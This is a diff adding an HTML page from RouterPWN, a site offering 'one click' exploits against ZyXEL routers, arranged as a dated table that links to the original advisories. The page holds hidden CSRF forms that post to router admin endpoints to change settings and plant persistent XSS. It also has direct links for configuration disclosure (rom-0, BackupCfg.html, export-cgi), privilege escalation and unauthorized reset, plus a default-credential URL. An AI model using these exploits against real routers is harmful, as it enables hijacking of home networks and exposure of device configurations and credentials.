@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html>
+ <head>
+  <title>
+   RouterPWN - ZyXEL - One click exploits, News, Vulnerabilities, POC, Alerts
+  </title>
+  <link href="includes/images/favicon.png" rel="apple-touch-icon"/>
+  <link href="includes/images/favicon.ico" rel="shortcut icon"/>
+  <script src="../includes/jquery-1.11.1.min.js">
+  </script>
+  <script src="../includes/jquery.dataTables.min.js">
+  </script>
+  <link href="../includes/jquery.dataTables.css" rel="stylesheet"/>
+  <link href="../includes/menu.css" rel="stylesheet"/>
+ </head>
+ <body>
+  <table align="center" cellspacing="0" style="background-image:url(../includes/images/headerbeta.jpg); background-position:center 0px; background-repeat:no-repeat; " width="925">
+   <tbody>
+    <tr>
+     <td>
+      <center>
+       <img src="../includes/images/logo.gif"/>
+      </center>
+     </td>
+    </tr>
+    <tr>
+     <td>
+      <section class="container">
+       <nav>
+        <ul class="nav">
+         <li>
+          &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+         </li>
+         <li class="active">
+          <a href="/" title="Latest updates by brand">
+           Home
+          </a>
+         </li>
+         <li>
+          <a href="/Generators" title="Online key generators and algorithms">
+           Generators
+          </a>
+         </li>
+         <li>
+          <a href="/Tools" title="Free tools for router hacking">
+           Tools
+          </a>
+         </li>
+         <li>
+          <a href="/Contribute" title="Contribute to Routerpwn.com">
+           Contribute
+          </a>
+         </li>
+         <li>
+          <a href="https://twitter.com/routerpwn" title="Follow Routerpwn updates on Twitter">
+           Follow
+          </a>
+         </li>
+         <li>
+          <a href="/Contact" title="Contact us">
+           Contact
+          </a>
+         </li>
+         <li>
+          <a href="/About" title="About Routerpwn.com">
+           About
+          </a>
+         </li>
+         <li>
+          &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+         </li>
+        </ul>
+       </nav>
+      </section>
+     </td>
+    </tr>
+    <tr>
+     <td>
+      <section id="zyxel">
+       <h1>
+        ZyXEL
+       </h1>
+       <table cellspacing="0" class="display" id="tabla" width="100%">
+        <thead>
+         <tr>
+          <th>
+           Date
+          </th>
+          <th>
+           Category
+          </th>
+          <th>
+           Source
+          </th>
+          <th>
+           Title
+          </th>
+          <th>
+           Author
+          </th>
+         </tr>
+        </thead>
+        <tfoot>
+         <tr>
+          <th>
+           Date
+          </th>
+          <th>
+           Category
+          </th>
+          <th>
+           Source
+          </th>
+          <th>
+           Title
+          </th>
+          <th>
+           Author
+          </th>
+         </tr>
+        </tfoot>
+        <tbody>
+         <form action="http://192.168.1.1/forms/General_1" id="zyxelxss" method="post" name="zyxelxss">
+          <input name="sysSystemname" type="hidden"/>
+          <input name="sysDomainname" type="hidden"/>
+          <input name="StdioTimout" type="hidden" value="0"/>
+          <input name="sysSubmit" type="hidden" value="Apply"/>
+         </form>
+         <form action="http://192.168.1.1/Forms/PortForwarding_Edit_1" id="zyxelxssp" method="post" name="zyxelxssp">
+          <input name="PortRule_Name" type="hidden" value=""/>
+          <input name="PortRule_SPort" type="hidden" value="77"/>
+          <input name="PortRule_EPort" type="hidden" value="77"/>
+          <input name="PortRule_SrvAddr" type="hidden" value="10.0.0.1"/>
+         </form>
+         <tr>
+          <td>
+           05/27/14
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://packetstormsecurity.com/files/126812/Zyxel-P-660HW-T1-Cross-Site-Request-Forgery.html">
+            packetstormsecurity.com
+           </a>
+          </td>
+          <td>
+           <a href="javascript:zyxel_660hwt1_v3_changessidpass()">
+            Zyxel P-660HW-T1 v3 Wireless Router - Change Wifi password &amp; SSID
+           </a>
+           <a href="javascript:zyxel_660hwt1_v3_changessidpass(ip)" onclick="return ip=prompt('IP:');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           05/04/11
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://int21.de/cve/CVE-2011-0746-o2-router.html">
+            int21.de
+           </a>
+          </td>
+          <td>
+           <a href="javascript:zyxelxssp()">
+            O2 Classic persistent cross site scripting
+           </a>
+           <a href="javascript:zyxelxsspr()">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           05/04/11
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.redteam-pentesting.de/en/advisories/rt-sa-2011-004/-client-side-authorization-zyxel-zywall-usg-appliances-web-interface">
+            www.redteam-pentesting.de
+           </a>
+          </td>
+          <td>
+           <a href="https://192.168.0.1/cgi-bin/export-cgi?category=config&amp;arg0=startup-config.conf">
+            ZyWALL USG client side authorization config disclosure
+           </a>
+           <a href="javascript:setip('/cgi-bin/export-cgi?category=config&amp;arg0=startup-config.conf')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           02/18/09
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://mfs-enterprise.com/security/site/en/advisory/Security_Advisory_ZyXEL.pdf">
+            mfs-enterprise.com
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.1.1/cgi-bin/ExportCurrentSettings?exportsetting=1">
+            G-570S configuration disclosure
+           </a>
+           <a href="javascript:setip('/cgi-bin/ExportCurrentSettings?exportsetting=1')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           03/03/08
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.gnucitizen.org/static/blog/2008/04/hacking_zyxel_gateways_part_2.pdf">
+            www.gnucitizen.org
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.1.1/BackupCfg.html">
+            Prestige configuration disclosure
+           </a>
+           <a href="javascript:setip('/BackupCfg.html')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           02/19/08
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.packetstormsecurity.org/papers/attack/Hacking_ZyXEL_Gateways.pdf">
+            www.packetstormsecurity.org
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.1.1/rpSysAdmin.html">
+            Prestige privilege escalation
+           </a>
+           <a href="javascript:setip('/rpSysAdmin.html')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           00/00/0?
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://user:1234@192.168.1.1/">
+            Prestige default password
+           </a>
+           <a href="javascript:zyxeldefault()">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           00/00/0?
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://everlost.nl/kender/zyxel/">
+            everlost.nl
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.1.1/rom-0">
+            ZyNOS configuration disclosure
+           </a>
+           <a href="javascript:setip('/rom-0')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           10/08/07
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://louhisecurity.fi//advisory/zyxel_070810.txt">
+            louhisecurity.fi
+           </a>
+          </td>
+          <td>
+           <a href="javascript:zyxelxss()">
+            Zywall2 Persistent Cross Site Scripting
+           </a>
+           <a href="javascript:zyxelxssr()">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           11/21/04
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.securityfocus.com/archive/1/381835/30/0/threaded">
+            www.securityfocus.com
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.1.1/rpFWUpload.html">
+            Prestige unauthorized reset
+           </a>
+           <a href="javascript:setip('/rpFWUpload.html')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+        </tbody>
+       </table>
+      </section>
+      <script>
+       $(document).ready(function() {
+    $('#tabla').dataTable( {
+        "order": [[ 0, "desc" ]]
+    } );
+} );
+      </script>
+      <script type="text/javascript">
+       var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+      </script>
+      <script type="text/javascript">
+       try {
+var pageTracker = _gat._getTracker("UA-16172640-1");
+pageTracker._trackPageview();
+} catch(err) {}
+      </script>
+     </td>
+    </tr>
+   </tbody>
+  </table>
+ </body>
+</html>
